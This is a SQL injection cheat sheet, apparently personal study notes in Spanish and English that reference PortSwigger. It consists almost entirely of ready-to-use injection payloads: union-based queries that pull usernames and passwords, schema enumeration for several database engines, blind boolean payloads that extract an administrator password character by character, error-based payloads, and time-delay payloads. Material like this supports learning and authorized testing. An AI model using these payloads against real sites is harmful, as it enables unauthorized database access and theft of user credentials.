# COMMON ATTACKS
Tener en cuenta que no siempre comienza con ' si no con ", )", )', etc...

WHERE QUERY: ```SELECT * FROM USERS WHERE username= '???'```

LOGIN QUERY: ```SELECT * FROM USERS WHERE username= '???' AND password= '???'```

# UNION ATTACK
COMMON QUERY: ```SELECT a, b FROM table1 UNION SELECT c, d FROM table2```

Determinar el número de columnas: ```' ORDER BY 1--```

MySQL: ```' UNION SELECT '1','2','3','4'-- -```

ORACLE: ```' UNION SELECT NULL FROM DUAL--```

CONCATENATION:  ```' UNION SELECT username || '~' || password FROM users-- ```

# EXTRAER INFORMACIÓN DE LA DB

| Database type | Query |
|---------------|-------|
| Microsoft, MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

Contenido de todas la DB menos ORACLE:

Extraccion de tablas: ```SELECT * FROM information_schema.tables```

Extraccion de columnas: ```SELECT * FROM information_schema.columns WHERE table_name = 'Users'```

Contenido de DB ORACLE

Extraccion de tablas: ```SELECT * FROM all_tables```

Extraccion de columnas: ```SELECT * FROM all_tab_columns WHERE table_name = 'USERS'```

# BLIND SQL
Cantidad de Caracteres: ```xyz' AND LENGTH((SELECT Password FROM Users WHERE Username = 'Administrator')) = 1 --```

Valor exacto: ```xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's' --```

Valor en ASCII: ```xyz' AND ASCII(SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)) = 118 --```

Del 32-126

## Error-based

Non-ORACLE: ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END)=1--```

ORACLE: ``` xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM DUAL)=1--```

## Message Error

```
 CAST((SELECT example_column FROM example_table) AS int) 
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

## Time delays
Oracle:	dbms_pipe.receive_message(('a'),10)

Microsoft:	WAITFOR DELAY '0:0:10'

PostgreSQL:	SELECT pg_sleep(10) ``` '||(SELECT pg_sleep(10) WHERE (1=1))--```

MySQL:	SELECT SLEEP(10)


# Referencias
- [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
